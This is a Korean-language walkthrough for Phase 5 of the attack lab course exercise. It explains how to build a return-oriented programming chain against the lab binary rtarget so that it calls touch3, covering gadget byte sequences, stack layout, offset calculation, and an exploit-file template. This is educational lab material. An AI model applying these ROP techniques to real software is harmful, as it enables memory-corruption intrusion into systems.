# Phase 5 해결 가이드 (ROP-Level 3)

## 목표
- RTARGET에서 ROP 공격을 사용하여 `touch3` 함수 호출
- cookie의 문자열 표현에 대한 포인터를 `%rdi` 레지스터에 전달

## 시작하기 전에 필요한 작업

### 1. 서버에서 파일 다운로드
```bash
# 서버 접속 후
tar xvf targetk.tar
ls  # README.txt, ctarget, rtarget, cookie.txt, farm.c, hex2raw 확인
```

### 2. 필요한 정보 수집
```bash
# cookie 값 확인
cat cookie.txt

# rtarget 디스어셈블
objdump -d rtarget > rtarget.d

# farm.c도 확인
cat farm.c
```

## Phase 5 해결 전략

### 핵심 과제
1. **문자열 저장 위치 찾기**: cookie의 16진수 문자열을 스택의 안전한 위치에 저장
2. **문자열 주소 계산**: 스택 포인터를 기반으로 문자열 주소 계산
3. **%rdi에 주소 전달**: 계산된 주소를 %rdi 레지스터로 이동
4. **touch3 호출**: 최종적으로 touch3 함수로 점프

### 왜 Phase 5가 어려운가?

Phase 4와 달리:
- **스택 위치가 랜덤화**되어 고정된 주소를 사용할 수 없음
- **문자열을 스택에 저장**해야 하는데, hexmatch와 strncmp가 스택을 덮어씀
- **%rsp를 기준으로 동적으로 주소를 계산**해야 함
- **산술 연산을 수행할 가젯**이 필요함

### 필요한 가젯 유형

1. **popq** 가젯 - 스택에서 값을 레지스터로
2. **movq** 가젯 - 레지스터 간 이동
3. **movl** 가젯 - 32비트 이동 (상위 32비트를 0으로 클리어)
4. **add_xy** 가젯 - 두 레지스터 값을 더하기
5. **lea** 가젯 - 주소 계산

## 단계별 해결 방법

### Step 1: cookie를 문자열로 변환
```bash
# 예: cookie가 0x59b997fa라면
# ASCII로 변환: "35 39 62 39 39 37 66 61 00"
```

각 16진수 자릿수를 ASCII로 변환:
- '0'-'9': 0x30-0x39
- 'a'-'f': 0x61-0x66

### Step 2: rtarget.d에서 유용한 가젯 찾기

가젯 팜(start_farm ~ end_farm)에서 다음을 찾아야 함:

#### 필수 가젯들:
```assembly
# 1. popq %rax: 58 c3
# 2. movq %rsp, %rax: 48 89 e0 c3
# 3. movq %rax, %rdi: 48 89 c7 c3
# 4. popq %rsi: 5e c3 (또는 다른 레지스터)
# 5. movl %eax, %edx: 89 c2 c3
# 6. movl %edx, %ecx: 89 d1 c3
# 7. movl %ecx, %esi: 89 ce c3
# 8. lea (%rdi,%rsi,1),%rax: 48 8d 04 37 c3
```

**가젯 검색 방법:**
```bash
# rtarget.d에서 start_farm과 end_farm 사이 검색
# 바이트 시퀀스를 찾을 때는 함수 중간에 있을 수도 있음에 유의
```

### Step 3: 공격 문자열 구조 설계

```
+------------------+  <- getbuf의 buf 시작
| padding (40 bytes)|  버퍼 채우기
+------------------+  <- 원래 리턴 주소
| gadget 1 주소    |  movq %rsp, %rax
+------------------+
| gadget 2 주소    |  movq %rax, %rdi
+------------------+
| gadget 3 주소    |  popq %rax
+------------------+
| offset 값        |  문자열까지의 오프셋
+------------------+
| gadget 4 주소    |  movl %eax, %edx
+------------------+
| gadget 5 주소    |  movl %edx, %ecx
+------------------+
| gadget 6 주소    |  movl %ecx, %esi
+------------------+
| gadget 7 주소    |  lea (%rdi,%rsi,1),%rax
+------------------+
| gadget 8 주소    |  movq %rax, %rdi
+------------------+
| touch3 주소      |  최종 목적지
+------------------+
| 추가 padding     |
+------------------+
| cookie 문자열    |  "59b997fa\0"
+------------------+
```

### Step 4: 오프셋 계산

문자열의 위치를 계산해야 합니다:
1. gadget 1 실행 후 %rsp는 gadget 2의 주소를 가리킴
2. 문자열까지의 바이트 수를 계산 (보통 48-72바이트)
3. 이 값을 스택에 저장하여 popq로 로드

### Step 5: exploit.txt 작성 예시

```
/* Phase 5 exploit */
/* 버퍼 패딩 (40 bytes) */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* Gadget 1: movq %rsp, %rax */
xx xx xx xx xx xx xx xx  /* 실제 주소로 교체 */

/* Gadget 2: movq %rax, %rdi */
xx xx xx xx xx xx xx xx

/* Gadget 3: popq %rax */
xx xx xx xx xx xx xx xx

/* Offset 값 (문자열까지의 거리) */
48 00 00 00 00 00 00 00  /* 예시: 72 bytes */

/* Gadget 4-8: 연산 수행 */
xx xx xx xx xx xx xx xx  /* movl %eax, %edx */
xx xx xx xx xx xx xx xx  /* movl %edx, %ecx */
xx xx xx xx xx xx xx xx  /* movl %ecx, %esi */
xx xx xx xx xx xx xx xx  /* lea (%rdi,%rsi,1),%rax */
xx xx xx xx xx xx xx xx  /* movq %rax, %rdi */

/* touch3 주소 */
xx xx xx xx xx xx xx xx

/* 추가 패딩 (필요시) */
00 00 00 00 00 00 00 00

/* Cookie 문자열 (예: 0x59b997fa) */
35 39 62 39 39 37 66 61 00
```

## 실용적인 팁

### 1. GDB 사용하여 디버깅
```bash
gdb rtarget
(gdb) break getbuf
(gdb) run < exploit-raw.txt
(gdb) x/24gx $rsp  # 스택 내용 확인
(gdb) stepi        # 명령어 단위 실행
(gdb) info registers  # 레지스터 확인
```

### 2. 가젯 찾기 팁
```bash
# rtarget.d에서 바이트 패턴 검색
grep "48 89 e0" rtarget.d  # movq %rsp, %rax
grep "48 89 c7" rtarget.d  # movq %rax, %rdi
```

**중요**: 가젯은 함수의 중간에 숨어있을 수 있습니다!
- 예: `c7 07 48 89 c7` 명령어에서 `48 89 c7 c3`를 추출

### 3. movl의 효과 이해
`movl`은 32비트 이동이지만 목적지 레지스터의 **상위 32비트를 0으로 클리어**합니다.
```
movl %eax, %edx  →  %rdx의 하위 32비트 = %eax, 상위 32비트 = 0
```
이를 이용하여 큰 값을 정리할 수 있습니다.

### 4. 오프셋 계산 주의사항
- 각 가젯 주소는 8바이트
- popq 다음의 데이터도 8바이트
- 문자열의 위치는 모든 가젯과 데이터 이후

### 5. 일반적인 실수들
1. **리틀 엔디안 잊기**: 주소는 거꾸로 (예: 0x401234 → 34 12 40 00 00 00 00 00)
2. **오프셋 계산 오류**: 스택 포인터의 위치를 정확히 파악
3. **가젯 주소 오류**: start_farm과 end_farm 밖의 주소 사용
4. **0x0a(newline) 포함**: exploit 문자열에 0x0a가 있으면 안 됨
5. **null 종료자 빠뜨림**: 문자열 끝에 0x00 필수

## 테스트 및 제출

### 테스트
```bash
./hex2raw < exploit.txt > exploit-raw.txt
./rtarget -i exploit-raw.txt
```

### 성공 메시지
```
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASSED: Sent exploit string to server to be validated.
NICE JOB!
```

## 추가 도구 및 자동화

### 바이트 코드 생성
```bash
# assembly.s 파일 작성
gcc -c assembly.s
objdump -d assembly.o
```

### 가젯 검색 스크립프트 (선택사항)
```python
# find_gadgets.py
import re

with open('rtarget.d', 'r') as f:
    content = f.read()
    
# 특정 바이트 패턴 검색
patterns = [
    (r'48 89 e0.*?c3', 'movq %rsp, %rax'),
    (r'48 89 c7.*?c3', 'movq %rax, %rdi'),
    # ... 더 추가
]

for pattern, desc in patterns:
    matches = re.findall(pattern, content)
    if matches:
        print(f"Found {desc}: {matches}")
```

## 체크리스트

해결하기 전에 확인:
- [ ] cookie.txt에서 cookie 값 확인
- [ ] rtarget 디스어셈블 완료
- [ ] touch3의 주소 찾기
- [ ] getbuf의 버퍼 크기 확인 (보통 40바이트)
- [ ] 가젯 팜 범위 확인 (start_farm ~ end_farm)
- [ ] 필요한 8개 가젯 모두 찾기
- [ ] 오프셋 정확히 계산
- [ ] 리틀 엔디안 형식으로 변환
- [ ] 0x0a 없는지 확인
- [ ] GDB로 테스트

## 참고: Phase 4 (비교용)

Phase 4는 간단했습니다:
1. popq %rdi 가젯 찾기
2. cookie 값을 스택에 배치
3. touch2 호출

Phase 5는 주소 계산이 필요해서 훨씬 복잡합니다.

## 문제 해결

### "Segmentation fault"
- 가젯 주소가 올바른지 확인
- 스택 정렬 확인

### "Misfire: You called touch3(...)"
- 문자열 포인터가 올바른 위치를 가리키는지 확인
- 오프셋 재계산

### "Ouch!: You caused a segmentation fault!"
- 모든 가젯이 ret(0xc3)로 끝나는지 확인
- 가젯이 start_farm과 end_farm 사이에 있는지 확인

## 다음 단계

이 가이드를 따라 실제 파일들로 작업하세요:

1. 서버에서 targetk.tar 다운로드
2. objdump로 rtarget 분석
3. 필요한 가젯 찾기
4. exploit.txt 작성
5. 테스트 및 디버깅
6. 제출

행운을 빕니다! 🎯

